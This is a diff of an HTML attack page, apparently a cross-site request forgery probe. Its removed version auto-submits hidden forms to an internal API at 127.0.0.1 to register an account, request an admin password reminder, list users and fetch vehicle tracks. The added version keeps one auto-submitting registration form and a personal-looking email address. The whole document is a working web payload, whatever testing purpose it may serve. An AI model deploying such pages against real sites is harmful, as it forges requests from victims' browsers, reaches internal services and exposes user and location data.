@@ -1,23 +1,5 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>R</title>
-<style>body{font:11px monospace;margin:4px}iframe{width:100%;height:120px;border:1px solid #999;display:block;margin:4px 0}</style>
-</head><body>
-<pre id="o">Internal API Probe from localhost</pre>
-
-<!-- iframe targets for form responses -->
-<p>1. Register attempt:</p>
-<iframe name="f_register" id="f_register"></iframe>
-
-<p>2. Remind (admin):</p>
-<iframe name="f_remind" id="f_remind"></iframe>
-
-<p>3. Users list:</p>
-<iframe name="f_users" id="f_users"></iframe>
-
-<p>4. Tracks:</p>
-<iframe name="f_tracks" id="f_tracks"></iframe>
-
-<!-- forms auto-submit to localhost, responses load in iframes -->
-<form id="frm_register" method="POST" action="https://127.0.0.1/backend/ax/user.php" target="f_register" style="display:none">
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>R</title></head><body>
+<form id="f" method="POST" action="https://127.0.0.1/backend/ax/user.php">
 <input name="cmd" value="register">
 <input name="login" value="naysser_test">
 <input name="email" value="pay.nasseur@gmail.com">
@@ -25,27 +7,5 @@
 <input name="name" value="SecurityTest">
 <input name="acc_id" value="0">
 </form>
-
-<form id="frm_remind" method="POST" action="https://127.0.0.1/backend/ax/user.php" target="f_remind" style="display:none">
-<input name="cmd" value="remind">
-<input name="email" value="admin">
-</form>
-
-<form id="frm_users" method="POST" action="https://127.0.0.1/backend/ax/user.php" target="f_users" style="display:none">
-<input name="cmd" value="users_list">
-<input name="acc_id" value="0">
-</form>
-
-<form id="frm_tracks" method="POST" action="https://127.0.0.1/backend/ax/tracks.php" target="f_tracks" style="display:none">
-<input name="cmd" value="last">
-<input name="acc_id" value="0">
-<input name="veh_id" value="1">
-</form>
-
-<script>
-document.getElementById('frm_register').submit();
-setTimeout(function(){document.getElementById('frm_remind').submit()},500);
-setTimeout(function(){document.getElementById('frm_users').submit()},1000);
-setTimeout(function(){document.getElementById('frm_tracks').submit()},1500);
-</script>
+<script>document.getElementById('f').submit()</script>
 </body></html>
